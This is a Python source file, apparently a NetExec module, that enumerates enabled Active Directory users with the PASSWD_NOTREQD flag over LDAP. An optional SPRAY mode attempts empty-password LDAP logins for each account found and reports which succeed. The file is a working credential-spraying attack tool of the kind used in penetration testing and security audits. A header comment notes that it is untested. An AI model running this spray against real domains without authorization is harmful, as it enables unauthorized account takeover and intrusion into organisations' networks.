#### Need to test in actual environment where this is present!!!!!

from nxc.helpers.misc import CATEGORY
from nxc.logger import nxc_logger
from impacket.ldap.ldap import LDAPSearchError
from impacket.ldap.ldapasn1 import SearchResultEntry
from impacket.ldap import ldap as ldap_impacket


class NXCModule:
    """
    Find enabled domain users with PASSWD_NOTREQD set.

    Usage:
      -M pass-not-req
      -M pass-not-req -o SPRAY or -o SPRAY=true
    """

    name = "pass-not-req"
    description = "Find enabled users with PASSWD_NOTREQD and optionally spray empty password"
    supported_protocols = ["ldap"]
    category = CATEGORY.ENUMERATION

    def options(self, context, module_options):
        """
        SPRAY   Optional boolean to attempt login with empty password for each account (e.g. -o SPRAY or -o SPRAY=true)
        """
        self.spray = False
        if module_options is None:
            return
        # accept any case and empty value
        for k, v in module_options.items():
            if k.upper() == "SPRAY":
                if v is None or v == "":
                    self.spray = True
                else:
                    self.spray = str(v).lower() in ["1", "true", "yes"]

    def on_login(self, context, connection):
        # PASSWD_NOTREQD bit = 0x20 (32), ACCOUNTDISABLE = 0x2
        # filter: user objects, not computers, PASSWD_NOTREQD present, and not disabled
        search_filter = '(&(objectClass=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=32)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'
        attributes = ["sAMAccountName", "distinguishedName", "userAccountControl", "displayName"]

        try:
            context.log.debug(f"Search Filter={search_filter}")
            resp = connection.ldap_connection.search(searchFilter=search_filter, attributes=attributes, sizeLimit=0)
        except LDAPSearchError as e:
            if e.getErrorString().find("sizeLimitExceeded") >= 0:
                context.log.debug("sizeLimitExceeded exception caught, processing partial results")
                resp = e.getAnswers()
            else:
                nxc_logger.debug(e)
                context.log.fail("LDAP search failed")
                return False

        users = []
        for item in resp:
            if not isinstance(item, SearchResultEntry):
                continue
            try:
                attrs = {str(a["type"]): a["vals"] for a in item["attributes"]}
            except Exception:
                continue

            sam = None
            dn = None
            name = None
            if "sAMAccountName" in attrs and attrs["sAMAccountName"]:
                sam = str(attrs["sAMAccountName"][0])
            if "distinguishedName" in attrs and attrs["distinguishedName"]:
                dn = str(attrs["distinguishedName"][0])
            if "displayName" in attrs and attrs["displayName"]:
                name = str(attrs["displayName"][0])

            users.append({"sam": sam or name or dn, "dn": dn, "sam_raw": sam})

        if not users:
            context.log.success("No enabled users with PASSWD_NOTREQD found.")
            return True

        context.log.success(f"Found {len(users)} enabled user(s) with PASSWD_NOTREQD:")
        for u in users:
            context.log.highlight(f"- {u['sam']:<30} DN={u['dn']}")

        if not self.spray:
            return True

        # Spray: attempt empty-password LDAP bind for each account
        context.log.info("Attempting empty-password spray for found users")
        successes = []
        proto = "ldaps" if getattr(connection, "port", 389) == 636 else "ldap"
        ldap_url = f"{proto}://{connection.host}"

        for u in users:
            username = u.get("sam_raw") or u.get("sam")
            if not username:
                continue
            try:
                ldapc = ldap_impacket.LDAPConnection(ldap_url, dstIp=connection.host)
                # attempt login with empty password
                try:
                    ldapc.login(user=username, password="", domain=connection.domain)
                    successes.append(username)
                    context.log.success(f"Empty-password login succeeded for {username}")
                except Exception as e:
                    context.log.debug(f"Empty-password login failed for {username}: {e}")
                finally:
                    try:
                        ldapc.close()
                    except Exception:
                        pass
            except Exception as e:
                context.log.debug(f"Failed to create LDAP connection for spraying: {e}")

        if successes:
            context.log.success(f"Empty-password succeeded for {len(successes)} account(s): {', '.join(successes)}")
        else:
            context.log.fail("No empty-password logins succeeded")

        return True